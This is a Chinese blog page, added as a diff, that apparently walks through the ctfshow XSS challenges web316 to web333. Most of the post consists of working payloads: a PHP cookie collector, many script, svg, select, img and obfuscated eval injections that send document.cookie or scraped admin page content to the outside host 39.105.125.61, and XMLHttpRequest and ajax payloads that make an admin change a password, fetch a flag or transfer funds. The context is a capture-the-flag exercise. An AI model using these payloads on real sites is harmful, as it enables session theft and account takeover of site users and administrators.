@@ -1,0 +1,288 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>xss | anz</title><meta name="author" content="anz"><meta name="copyright" content="anz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web316服务器部署index.php 123&lt;?php$cookie&#x3D;$_GET[1];file_put_contents(&quot;cookie.txt&quot;,$cookie,FILE_APPEND);  xss.js 123var img &#x3D; new Image();img.src &#x3D; &quot;http:&#x2F;&#x2F;39.105.125.61&#x2F;index.php?1&#x3D;&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss">
+<meta property="og:url" content="https://aaanz.github.io/ctfshow/xss/XSS/index.html">
+<meta property="og:site_name" content="anz">
+<meta property="og:description" content="web316服务器部署index.php 123&lt;?php$cookie&#x3D;$_GET[1];file_put_contents(&quot;cookie.txt&quot;,$cookie,FILE_APPEND);  xss.js 123var img &#x3D; new Image();img.src &#x3D; &quot;http:&#x2F;&#x2F;39.105.125.61&#x2F;index.php?1&#x3D;&quot;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg">
+<meta property="article:published_time" content="2023-03-15T00:26:38.000Z">
+<meta property="article:modified_time" content="2023-03-15T00:55:59.988Z">
+<meta property="article:author" content="anz">
+<meta property="article:tag" content="ctfshow">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://aaanz.github.io/ctfshow/xss/XSS/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xss',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-15 08:55:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/75899c342847e73b.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">anz</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">xss</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-15T00:26:38.000Z" title="发表于 2023-03-15 08:26:38">2023-03-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-15T00:55:59.988Z" title="更新于 2023-03-15 08:55:59">2023-03-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow/">ctfshow</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow/xss/">xss</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="xss"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>服务器部署index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="variable">$cookie</span>,FILE_APPEND);</span><br></pre></td></tr></table></figure>
+
+<p>xss.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://39.105.125.61/index.php?1=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(img);</span><br></pre></td></tr></table></figure>
+
+<p>发送请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=&lt;script src=&quot;http://39.105.125.61/xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=&lt;script src=&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230312162719445.png" alt="image-20230312162719445"></p>
+<h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>这里过滤了script</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie) autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=location.href=&quot;http://39.105.125.61/x.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=location.href=&quot;http://39.105.125.61/x.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie) autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie) autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>过滤空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web321-327"><a href="#web321-327" class="headerlink" title="web321-327"></a>web321-327</h1><p>万能onload~~~</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=eval(&#x27;\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x68\x72\x65\x66\x3d\x27\x68\x74\x74\x70\x3a\x2f\x2f\x33\x39\x2e\x31\x30\x35\x2e\x31\x32\x35\x2e\x36\x31\x2f\x78\x2e\x70\x68\x70\x3f\x63\x6f\x6f\x6b\x69\x65\x3d\x27\x2b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&#x27;document.write(String.fromCharCode(60)),document.write(String.fromCharCode(115)),document.write(String.fromCharCode(118)),document.write(String.fromCharCode(103)),document.write(String.fromCharCode(47)),document.write(String.fromCharCode(111)),document.write(String.fromCharCode(110)),document.write(String.fromCharCode(108)),document.write(String.fromCharCode(111)),document.write(String.fromCharCode(97)),document.write(String.fromCharCode(100)),document.write(String.fromCharCode(61)),document.write(String.fromCharCode(97)),document.write(String.fromCharCode(108)),document.write(String.fromCharCode(101)),document.write(String.fromCharCode(114)),document.write(String.fromCharCode(116)),document.write(String.fromCharCode(40)),document.write(String.fromCharCode(49)),document.write(String.fromCharCode(41)),document.write(String.fromCharCode(62));&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  a:</span><br><span class="line">	s=<span class="built_in">ord</span>(i)</span><br><span class="line">	tmp=<span class="string">&#x27;document.write(String.fromCharCode(&#123;&#125;))&#x27;</span>.<span class="built_in">format</span>(s)</span><br><span class="line">	payload+=tmp+<span class="string">&#x27;,&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var ol = document.querySelector(&#x27;.layui-container&#x27;);window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+ol.children[3].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var ol = document.querySelector(&#x27;.layui-container&#x27;);alert(ol.children[3].innerHTML);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>注册xss用户名,admin看到就偷到他cookie啦</p>
+<p>只有这个可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>下面的都不行……</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=location.href=&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=location.href=&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230313181731034.png" alt="image-20230313181731034"></p>
+<h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>以我们的用户管理界面做个参照,因为接受的js代码有长度限制,所以截取一下密码部分大概在<code>(700,1290)</code>这里</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230313200214177.png" alt="image-20230313200214177"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var ol = document.querySelector(&#x27;.layui-container&#x27;);window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+ol.children[3].innerHTML.substring(700,1290))&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230313200243482.png" alt="image-20230313200243482"></p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var ol = document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;);window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+ol[1].innerHTML);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>搭建一个js,然后让管理员访问它</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://your-domain/cookie.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#top &gt; div.layui-container &gt; div    :nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#x27;</span>).<span class="property">textContent</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(img);</span><br></pre></td></tr></table></figure>
+
+<p>这段定位的意思是</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#top &gt; div.<span class="property">layui</span>-container &gt; div    :nth-<span class="title function_">child</span>(<span class="number">4</span>) &gt; div &gt; div.<span class="property">layui</span>-table-box &gt; div.<span class="property">layui</span>-table-body.<span class="property">layui</span>-table-main</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>#top</code>: 选择元素的 ID 为 “top” 的祖先元素</li>
+<li><code>div.layui-container</code>: 选择该祖先元素下的 class 为 “layui-container” 的 div 元素</li>
+<li><code>div</code>: 选择上一步选择的 div 元素的直接子元素中的所有 div 元素</li>
+<li><code>:nth-child(4)</code>: 选择上一步选择的 div 元素的第四个子元素，即在其直接子元素中排在第四位的 div 元素</li>
+<li><code>div</code>: 选择上一步选择的 div 元素的直接子元素中的所有 div 元素</li>
+<li><code>div.layui-table-box</code>: 选择上一步选择的 div 元素的 class 为 “layui-table-box” 的子元素 div 元素</li>
+<li><code>div.layui-table-body.layui-table-main</code>: 选择上一步选择的 div 元素的 class 为 “layui-table-body” 和 “layui-table-main” 的子元素 div 元素</li>
+</ol>
+<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><p>jQuery</p>
+<p>测试一下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;console.log(value);&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230314091957090.png" alt="image-20230314091957090"></p>
+<p>可以的</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)</span><br><span class="line">&#123;<span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctfshow&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://39.105.125.61/x.php?cookie=&#x27;</span>+value.<span class="property">innerHTML</span>;&#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><h2 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一:"></a>方法一:</h2><p>阿哲……</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var ol = document.querySelector(&#x27;.layui-elem-quote&#x27;);window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+ol.innerHTML.substring(1,1290))&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230313211716502.png" alt="image-20230313211716502"></p>
+<h2 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h2><p>直接本地让管理员发个请求</p>
+<p>多带一句为了看看payload是否正常发送了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://127.0.0.1/api/change.php?p=anzanz&#x27;);window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230313211157905.png" alt="image-20230313211157905"></p>
+<h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><h2 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h2><p>330方法一</p>
+<p>一样打</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230313212026207.png" alt="image-20230313212026207"></p>
+<h2 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h2><p>构造一个xmlpost请求,发过去就行啥都不用管</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> httpRequest = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();httpRequest.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>, <span class="literal">true</span>);httpRequest.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);httpRequest.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;p=anzanz&#x27;</span>);window.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;http://39.105.125.61/x.php?cookie=&#x27;</span>+document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="方法三-1"><a href="#方法三-1" class="headerlink" title="方法三:"></a>方法三:</h2><p><code>ajax</code>请求发送 很简短,orz</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web332-333"><a href="#web332-333" class="headerlink" title="web332-333"></a>web332-333</h1><h2 id="方法一-3"><a href="#方法一-3" class="headerlink" title="方法一"></a>方法一</h2><p>这一题上面的方法一不行了</p>
+<p>先尝试让admin买完flag给我</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> httpRequest = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">httpRequest.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;http://127.0.0.1/api/getFlag.php&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">httpRequest.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">httpRequest.<span class="title function_">send</span>(<span class="string">&#x27;ee=ef&#x27;</span>);</span><br><span class="line"> httpRequest.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"> 	<span class="keyword">if</span> (httpRequest.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; httpRequest.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line"> 	<span class="keyword">var</span> json = httpRequest.<span class="property">responseText</span>;</span><br><span class="line"> 	<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://39.105.125.61/x.php?cookie=&#x27;</span>+json);</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;;<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://39.105.125.61/x.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>……..</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230313214559523.png" alt="image-20230313214559523"></p>
+<p>看到有个转账</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> httpRequest = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">httpRequest.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;http://127.0.0.1/api/amount.php&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">httpRequest.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">httpRequest.<span class="title 